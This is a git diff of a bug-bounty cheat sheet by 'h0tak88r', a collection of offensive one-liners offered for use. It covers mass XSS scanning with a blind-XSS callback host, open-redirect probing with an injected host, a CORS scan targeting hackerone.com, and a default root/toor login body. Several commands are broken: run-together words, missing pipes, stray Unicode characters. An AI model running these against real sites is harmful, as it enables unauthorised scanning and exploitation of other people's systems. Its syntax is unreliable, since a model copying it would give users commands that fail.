@@ -1,4 +1,8 @@
-# BY: h0tak88r
+<aside>
+<img src="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/863852bf-ce40-4e73-99a3-f9e382f24e62/h0tak88r.jpeg" alt="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/863852bf-ce40-4e73-99a3-f9e382f24e62/h0tak88r.jpeg" width="40px" /> **BY: h0tak88r**
+
+</aside>
+
 # CVE’s
 
 ## #Nuclie
@@ -63,7 +67,7 @@ username=root&password=toor&commit=Login
 # #**XSS**
 
 ```bash
-[+] waybackurls HOST | gf xss | sed 's/=.*/=/' | sort -u tee FILE.txt && catFILE.txt❘dalfox -b YOURS.xss.ht pipe > OUT.txt
+[+] waybackurls HOST | gf xss | sed 's/=.*/=/' | sort -u tee FILE.txt && catFILE.txt❘ dalfox -b YOURS.xss.ht pipe > OUT.txt
 [+] cat HOSTS.txt | getJS | httpx --match-regex "addEventListener\((?:\\") message(?: '|\")"
 [+] gospider -S URLS.txt -c 10 d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other- source | grep -e "code-200" | awk '{print $5}' grep "=" qsreplace -a | dalfox pipe | tee OUT.txt
 ```
@@ -80,6 +84,13 @@ username=root&password=toor&commit=Login
 [+] export LHOST="URL"; gau $1 | gf redirect | qsreplace "$LHOST"| xargs -I %
 -P 25 sh -c 'curl -Is "" 2>&1 | grep -q "Location: $LHOST" && echo "VULN!٪"'
 [+] cat URLS.txt❘ gf url | tee url-redirect.txt && cat url-redirect.txt | parallel - 10 curl --proxy http://127.0.0.1:8080 -sk > /dev/null
+```
+
+# #CORS Misconfigurations
+
+```jsx
+subfinder -d hackerone.com -nW -silent | httprobe -c 70 -p 80,443,8080,8081,8089 | tee http_https.txt
+cat http_https.txt | CorsMe -t 70
 ```
 
 # #Prototype Pollution
